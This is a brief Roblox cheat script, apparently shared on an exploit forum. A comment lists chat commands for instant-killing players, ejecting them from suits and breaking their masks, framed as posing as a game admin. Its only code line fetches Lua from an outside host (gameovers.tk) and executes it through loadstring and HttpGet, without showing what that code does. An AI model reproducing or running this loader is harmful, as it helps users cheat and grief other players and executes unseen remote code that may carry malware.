--[[ Commands
>god -- makes u instant kill players [Works with any punch and guns works only with WARMACHINE]
>war -- Gives u war machine suit
>fog -- removes fog around you
>exit [player] -- ejects player from suit
>mask [player] -- opens/closes mask of player
>helmet [player] -- broke of mask any player
script discussed here: https://v3rmillion.net/showthread.php?tid=980736
directions: say the commands in-chat and it will make you look like a game admin lol.
]]

loadstring(game:HttpGet(('http://gameovers.tk/scripts/ironman.lua')))()